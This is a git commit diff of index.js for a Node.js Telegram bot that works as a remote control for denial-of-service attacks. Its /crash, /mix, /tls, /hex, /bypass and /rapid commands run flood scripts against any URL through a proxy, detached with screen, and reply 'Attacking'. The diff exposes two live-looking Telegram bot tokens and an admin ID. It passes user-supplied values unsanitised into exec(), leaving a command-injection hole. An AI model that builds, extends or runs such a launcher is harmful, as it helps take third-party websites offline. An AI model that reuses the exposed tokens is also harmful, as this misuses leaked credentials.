2129780130b3214ce2824ae43d379bef499f9fa3
FebryNoLimit <162716049+FebryNoLimit@users.noreply.github.com>
2024-04-21 19:20:04 +0700

    Add files via upload

--- index.js
+++ index.js
@@ -2,7 +2,7 @@ const TelegramBot = require('node-telegram-bot-api');
 const { exec } = require('child_process');
 
 // Token bot Telegram Anda
-const token = '7086354549:AAEGoa7OotbaJ5lfOuAwh1AoWGitjZfHz5I';
+const token = '7168240038:AAHlOxxujsWgGG3x544Wj-dWYbJu6YNAuHY';
 
 // ID admin yang diizinkan
 const adminId = '6803990183';
@@ -34,7 +34,7 @@ bot.onText(/\/crash (.+) (.+) (.+)/, (msg, match) => {
   }
 
   // Menjalankan perintah shell menggunakan exec
-  const process = exec(`node crash.js ${url} ${time} 60 5 ${proxy}`, (error, stdout, stderr) => {
+  const process = exec(`screen -dm node crash.js ${url} ${time} 60 5 ${proxy}`, (error, stdout, stderr) => {
     if (error) {
       bot.sendMessage(chatId, `Error: ${error.message}`);
       return;
@@ -71,7 +71,7 @@ bot.onText(/\/mix (.+) (.+) (.+)/, (msg, match) => {
   }
 
   // Menjalankan perintah shell menggunakan exec
-  const process = exec(`node mix.js ${url} ${time} 60 5 ${proxy}`, (error, stdout, stderr) => {
+  const process = exec(`screen -dm node mix.js ${url} ${time} 64 5 ${proxy}`, (error, stdout, stderr) => {
     if (error) {
       bot.sendMessage(chatId, `Error: ${error.message}`);
       return;
@@ -107,7 +107,7 @@ bot.onText(/\/tls (.+) (.+) (.+)/, (msg, match) => {
   }
 
   // Menjalankan perintah shell menggunakan exec
-  const process = exec(`node TLS.js ${url} ${time} 60 5 ${proxy}`, (error, stdout, stderr) => {
+  const process = exec(`screen -dm node tls.js ${url} ${time} 60 5 ${proxy}`, (error, stdout, stderr) => {
     if (error) {
       bot.sendMessage(chatId, `Error: ${error.message}`);
       return;
@@ -123,7 +123,7 @@ bot.onText(/\/tls (.+) (.+) (.+)/, (msg, match) => {
   processes.push(process);
 });
 
-bot.onText(/\/http (.+) (.+) (.+)/, (msg, match) => {
+bot.onText(/\/hex (.+) (.+) (.+)/, (msg, match) => {
   const chatId = msg.chat.id;
   const userId = msg.from.id;
   const url = match[1];
@@ -138,12 +138,84 @@ bot.onText(/\/http (.+) (.+) (.+)/, (msg, match) => {
 
   // Memeriksa apakah pesan lengkap
   if (!url || !time || !proxy) {
-    bot.sendMessage(chatId, 'Format Salah. Gunakan /tls [url] [time] [proxy]');
+    bot.sendMessage(chatId, 'Format Salah. Gunakan /hex [url] [time] [proxy]');
     return;
   }
 
   // Menjalankan perintah shell menggunakan exec
-  const process = exec(`node httpensz.js ${url} ${time} 50 ${proxy}`, (error, stdout, stderr) => {
+  const process = exec(`screen -dm node hex.js ${url} ${time} 64 8 ${proxy}`, (error, stdout, stderr) => {
+    if (error) {
+      bot.sendMessage(chatId, `Error: ${error.message}`);
+      return;
+    }
+    if (stderr) {
+      bot.sendMessage(chatId, `Error: ${stderr}`);
+      return;
+    }
+    bot.sendMessage(chatId, `Attacking ${url} with proxy ${proxy}`);
+  });
+
+  // Simpan referensi ke proses
+  processes.push(process);
+});
+
+bot.onText(/\/bypass (.+) (.+) (.+)/, (msg, match) => {
+  const chatId = msg.chat.id;
+  const userId = msg.from.id;
+  const url = match[1];
+  const time = match[2];
+  const proxy = match[3];
+
+  // Memeriksa apakah pengguna adalah admin yang diizinkan
+  if (userId.toString() !== adminId) {
+    bot.sendMessage(chatId, 'Anda tidak diizinkan menggunakan perintah ini.');
+    return;
+  }
+
+  // Memeriksa apakah pesan lengkap
+  if (!url || !time || !proxy) {
+    bot.sendMessage(chatId, 'Format Salah. Gunakan /bypass [url] [time] [proxy]');
+    return;
+  }
+
+  // Menjalankan perintah shell menggunakan exec
+  const process = exec(`screen -dm node bypass.js ${url} ${time} 64 8 ${proxy}`, (error, stdout, stderr) => {
+    if (error) {
+      bot.sendMessage(chatId, `Error: ${error.message}`);
+      return;
+    }
+    if (stderr) {
+      bot.sendMessage(chatId, `Error: ${stderr}`);
+      return;
+    }
+    bot.sendMessage(chatId, `Attacking ${url} with proxy ${proxy}`);
+  });
+
+  // Simpan referensi ke proses
+  processes.push(process);
+});
+
+bot.onText(/\/rapid (.+) (.+) (.+)/, (msg, match) => {
+  const chatId = msg.chat.id;
+  const userId = msg.from.id;
+  const url = match[1];
+  const time = match[2];
+  const proxy = match[3];
+
+  // Memeriksa apakah pengguna adalah admin yang diizinkan
+  if (userId.toString() !== adminId) {
+    bot.sendMessage(chatId, 'Anda tidak diizinkan menggunakan perintah ini.');
+    return;
+  }
+
+  // Memeriksa apakah pesan lengkap
+  if (!url || !time || !proxy) {
+    bot.sendMessage(chatId, 'Format Salah. Gunakan /hex [url] [time] [proxy]');
+    return;
+  }
+
+  // Menjalankan perintah shell menggunakan exec
+  const process = exec(`screen -dm node rapid.js ${url} ${time} 64 8 ${proxy}`, (error, stdout, stderr) => {
     if (error) {
       bot.sendMessage(chatId, `Error: ${error.message}`);
       return;
